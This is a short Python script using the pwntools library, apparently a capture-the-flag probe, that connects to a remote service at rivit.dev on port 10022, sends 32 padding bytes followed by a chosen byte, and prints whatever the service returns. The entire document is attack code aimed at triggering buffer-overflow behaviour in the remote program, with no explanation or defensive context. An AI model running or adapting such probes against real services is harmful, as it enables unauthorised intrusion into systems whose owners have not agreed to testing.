from pwn import *

context.log_level = 'critical'

flag = b""
for i in range(128, 129):
    io = remote("rivit.dev", 10022)
    io.sendline("A"*32 + chr(i))
    try:
        temp = io.recvall(timeout=1)
        print("%d - %s" % (i, temp))
        io.close()
    except:
        io.close()
        continue
